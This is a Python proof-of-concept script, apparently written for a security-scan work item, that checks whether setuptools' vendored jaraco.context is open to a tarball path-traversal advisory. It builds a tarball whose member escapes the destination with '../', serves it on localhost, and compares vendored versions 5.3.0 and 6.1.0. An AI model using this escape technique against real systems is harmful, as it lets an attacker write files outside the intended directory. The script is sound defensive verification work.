#!/usr/bin/env python3
"""Reproduce GHSA-58pv-8j8x-9vj2 against a setuptools-vendored jaraco.context copy.

Work package S03 of the 2026-09-21 security scan (issue #5602).

WHY THIS EXISTS
---------------
The scan reported jaraco-context 5.3.0 inside
/usr/local/lib/python3.10/site-packages/setuptools/_vendor/ in the pinned SkyPilot
image. A version number in package metadata is not evidence that the vulnerable code
is reachable, and the advisory's own fix (6.1.0) leaves the function the report names
-- strip_first_component -- textually unchanged. So the disposition for this finding
rests on executing the vendored code, not on reading its version.

The fix in 6.1.0 is the composition, not the filter: 6.1.0 wraps strip_first_component
with tarfile.data_filter, which rejects members resolving outside the destination.

WHAT IT DOES
------------
Extracts the setuptools/_vendor/ tree from two setuptools wheels, imports each
vendored jaraco.context directly (no install, no site-packages pollution), and asks
each to extract a tarball whose single member escapes via '../'. It then reports
whether the escape artifact actually appeared on disk.

Expected result: the copy vendored by setuptools 78.1.1 (the version in SkyPilot
0.12.0 through 0.12.3) writes the file outside the destination. The copy vendored by
setuptools >= 81.0.0 raises OutsideDestinationError and writes nothing.

RUN IT
------
    pip download setuptools==78.1.1 --no-deps -d /tmp/stcheck
    pip download setuptools==84.0.0 --no-deps -d /tmp/stcheck
    python3 S03-jaraco-context-traversal-check.py

Needs network only for the pip download; the check itself serves the archive from
localhost. Writes exclusively under a temporary directory.
"""

from __future__ import annotations

import functools
import http.server
import importlib.util
import io
import os
import pathlib
import shutil
import tarfile
import tempfile
import threading
import zipfile

# setuptools 78.1.1 vendors jaraco.context 5.3.0 (reported); 84.0.0 vendors 6.1.0 (fixed).
WHEELS = {
    "vendored-5.3.0": "/tmp/stcheck/setuptools-78.1.1-py3-none-any.whl",
    "vendored-6.1.0": "/tmp/stcheck/setuptools-84.0.0-py3-none-any.whl",
}
ESCAPE_NAME = "PWNED"


def extract_vendor(wheel: str, dest: str) -> None:
    """Unpack only setuptools/_vendor/ out of a setuptools wheel."""
    with zipfile.ZipFile(wheel) as z:
        for name in z.namelist():
            if name.startswith("setuptools/_vendor/"):
                z.extract(name, dest)


def load_vendored_context(vendor_root: str):
    """Import the vendored jaraco.context by path. 5.3.0 is a module, 6.1.0 a package."""
    for candidate in (
        os.path.join(vendor_root, "jaraco", "context", "__init__.py"),
        os.path.join(vendor_root, "jaraco", "context.py"),
    ):
        if os.path.exists(candidate):
            spec = importlib.util.spec_from_file_location("vendored_ctx", candidate)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            return module, candidate
    raise SystemExit(f"no vendored jaraco.context under {vendor_root}")


def build_malicious_tarball(path: str, escape_target: pathlib.Path) -> str:
    """One member, prefixed so strip_first_component turns it into a '../' escape."""
    relative = os.path.relpath(escape_target, "/")
    member_name = "dummy_dir/" + ("../" * (relative.count("/") + 4)) + relative
    payload = b"PWNED\n"
    with tarfile.open(path, "w:gz") as tar:
        info = tarfile.TarInfo(member_name)
        info.size = len(payload)
        tar.addfile(info, io.BytesIO(payload))
    return member_name


def serve(directory: str) -> tuple[str, http.server.ThreadingHTTPServer]:
    """tarball() takes a URL, so the archive has to be served rather than passed."""

    class QuietHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args, **kwargs) -> None:
            """Silence per-request logging so the evidence is the only output."""

    handler = functools.partial(QuietHandler, directory=directory)
    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return f"http://127.0.0.1:{httpd.server_port}", httpd


def main() -> int:
    tmp = tempfile.mkdtemp(prefix="s03-jaraco-")
    escape_target = pathlib.Path(tmp) / ESCAPE_NAME
    archive = os.path.join(tmp, "evil.tar.gz")
    member = build_malicious_tarball(archive, escape_target)
    base_url, httpd = serve(tmp)
    print(f"tarball member: {member}\nescape target:  {escape_target}\n")

    results: dict[str, bool] = {}
    try:
        for label, wheel in WHEELS.items():
            if not os.path.exists(wheel):
                raise SystemExit(
                    f"missing {wheel} -- run the pip download in the docstring"
                )
            vendor_dest = os.path.join(tmp, label)
            extract_vendor(wheel, vendor_dest)
            module, source = load_vendored_context(
                os.path.join(vendor_dest, "setuptools", "_vendor")
            )

            escape_target.unlink(missing_ok=True)
            workdir = os.path.join(tmp, f"work-{label}")
            os.makedirs(workdir, exist_ok=True)
            previous = os.getcwd()
            os.chdir(workdir)
            try:
                with module.tarball(f"{base_url}/evil.tar.gz"):
                    pass
                outcome = "completed without error"
            except Exception as exc:  # noqa: BLE001 - the rejection type is the evidence
                outcome = f"raised {type(exc).__name__}: {exc}"
            finally:
                os.chdir(previous)

            escaped = escape_target.exists()
            results[label] = escaped
            print(f"[{label}] {os.path.relpath(source, vendor_dest)}")
            print(f"[{label}] {outcome}")
            print(f"[{label}] ESCAPED = {escaped}\n")
    finally:
        httpd.shutdown()
        shutil.rmtree(tmp, ignore_errors=True)

    expected = {"vendored-5.3.0": True, "vendored-6.1.0": False}
    if results != expected:
        print(f"UNEXPECTED: got {results}, expected {expected}")
        return 1
    print(
        "As expected: the 5.3.0 copy escapes the destination, the 6.1.0 copy refuses."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
